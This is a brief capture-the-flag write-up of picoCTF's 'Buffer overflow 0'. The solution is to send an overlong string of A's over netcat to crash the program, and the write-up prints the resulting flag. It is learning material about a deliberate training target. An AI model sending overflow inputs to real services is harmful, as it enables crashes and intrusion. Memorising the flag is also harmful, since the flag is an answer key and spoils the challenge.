# Buffer overflow 0

## Solution
For the program to print the flag, we had to make the stack overflow
after seeing the code i figured that it returned the flag if there was
a segmentation fault in the input and the buffer was 16 characters big 
so i entered the input as AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
and got the flag

```
root@ASUS-ZN14:/mnt/c/Users/naira/Downloads# nc saturn.picoctf.net 55281
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## Flag
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}

```
